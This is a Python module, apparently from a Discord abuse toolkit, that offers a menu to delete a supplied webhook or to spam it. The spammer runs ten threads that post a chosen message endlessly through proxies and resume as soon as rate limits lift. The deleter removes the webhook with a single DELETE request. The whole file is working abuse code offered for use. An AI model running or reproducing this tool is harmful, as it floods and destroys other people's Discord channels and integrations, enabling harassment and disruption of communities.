import threading
from time import sleep

import requests
from colorama import Fore

from util.plugins.common import *


def spam_webhook(WebHook, Message):
    while True:
        response = requests.post(
            WebHook,
            proxies={"http": f'{proxy()}'},
            json={"content": Message},
            params={'wait': True}
        )
        try:
            if response.status_code == 204 or response.status_code == 200:
                print(f" {Fore.BLUE}<*> Message sent {Fore.RED}({response.status_code})")
            elif response.status_code == 429:
                print(f" {Fore.RED}<!> Rate limited ({response.json()['retry_after']}ms)")
                sleep(response.json()["retry_after"] / 1000)
            else:
                print(f" {Fore.RED}<!> Error: {response.status_code}")

            sleep(.01)
        except KeyboardInterrupt:
            break

def WebhookSpammer(WebHook, Message):
    print_slow("\"ctrl + c\" at anytime to stop\n")
    sleep(1.5)

    threads = []

    num_threads = 10

    for _ in range(num_threads):
        t = threading.Thread(target=spam_webhook, args=(WebHook, Message))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print_slow(f'{Fore.RED} <*> Spammed Webhook Successfully! ')
    
    input()

def webhooktool():
    XTitle("Discord Wehbook Tool")
    print(f'''
    {Fore.RED}[1] Webhook Deleter
    {Fore.RED}[2] Webhook Spammer    
                        ''')
    secondchoice = int(input(f'{Fore.RED} <~> Second Choice: {Fore.BLUE}'))
    if secondchoice not in [1, 2]:
        print(f'{Fore.RED} <!> Invalid Second Choice')
        sleep(1)

    if secondchoice == 1:
        WebHook = input(f'{Fore.RED} <~> Webhook: {Fore.BLUE}')
        CheckWebhook(WebHook)
        try:
            requests.delete(WebHook)
            print(f'\n{Fore.RED} <*> Webhook Successfully Deleted!\n')
        except Exception as e:
            print(f'{Fore.RED} <!> {Fore.WHITE}{e} {Fore.RED}happened while trying to delete the Webhook')

        
    if secondchoice == 2:
        WebHook = input(f'{Fore.RED} <~> Webhook: {Fore.BLUE}')
        CheckWebhook(WebHook)
        Message = str(input(f'{Fore.RED} <~> Message: {Fore.BLUE}'))
        WebhookSpammer(WebHook, Message)